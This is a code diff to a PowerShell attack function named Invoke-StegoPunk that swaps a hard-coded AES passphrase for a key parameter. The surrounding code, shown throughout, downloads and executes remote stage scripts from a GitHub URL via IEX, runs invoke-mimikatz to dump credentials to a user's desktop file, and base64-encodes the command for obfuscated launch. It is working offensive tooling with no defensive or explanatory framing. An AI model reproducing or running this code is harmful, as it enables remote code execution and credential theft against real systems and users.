@@ -10,6 +10,7 @@ function Invoke-StegoPunk {
             [string]$Fileurl,
             [string]$ImageUrl,
             [string]$ImageName,
+            [string]$key,
             [ValidateSet("on","off")]
             [string]$b_UAC
             
@@ -32,7 +33,7 @@ function Invoke-StegoPunk {
           write-host "Encrypting First Stage File ..."
           $InputBytes = [Text.Encoding]::utf8.GetBytes($InputString)
           $AES = New-Object System.Security.Cryptography.AesManaged
-          $Passphrase="Passo"
+          $Passphrase=$key
           $salt="My Voice is my P455W0RD!"
           $init="Yet another key"
           $pass = [Text.Encoding]::UTF8.GetBytes($Passphrase)
@@ -95,9 +96,9 @@ function Invoke-StegoPunk {
                 $stage2.proxy = $proxy
                 $stage2.usedefaultcredentials = "true"
                 IEX $stage2.Downloadstring('https://raw.githubusercontent.com/Tru5tNo1/Cyberwar/master/Invoke-AES2Stage.ps1')
-                $base2 = Invoke-AES2Stage -imageurl $imageurl
+                $base2 = Invoke-AES2Stage -key $key -imageurl $imageurl
                 iex ($base2)
-                $cmd = '$stage2 = New-Object System.Net.WebCLient;$proxy = New-Object System.Net.webproxy; $stage2.proxy = $proxy; $stage2.usedefaultcredentials = "true"; IEx $stage2.Downloadstring("https://raw.githubusercontent.com/Tru5tNo1/Cyberwar/master/Invoke-AES1Stage.ps1");$base1 = Invoke-AES1Stage -imageurl ' + $imageurl + '; iex ($base1); invoke-mimikatz -dumpcreds > c:\users\v.delaurentis\desktop\vito.txt'
+                $cmd = '$stage2 = New-Object System.Net.WebCLient;$proxy = New-Object System.Net.webproxy; $stage2.proxy = $proxy; $stage2.usedefaultcredentials = "true"; IEx $stage2.Downloadstring("https://raw.githubusercontent.com/Tru5tNo1/Cyberwar/master/Invoke-AES1Stage.ps1");$base1 = Invoke-AES1Stage -key ' + $key + '-imageurl ' + $imageurl + '; iex ($base1); invoke-mimikatz -dumpcreds > c:\users\v.delaurentis\desktop\vito.txt'
                 $ubytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
                 $encodedcmd = [Convert]::ToBase64String($ubytes) 
                 write-Host `n$encodedcmd
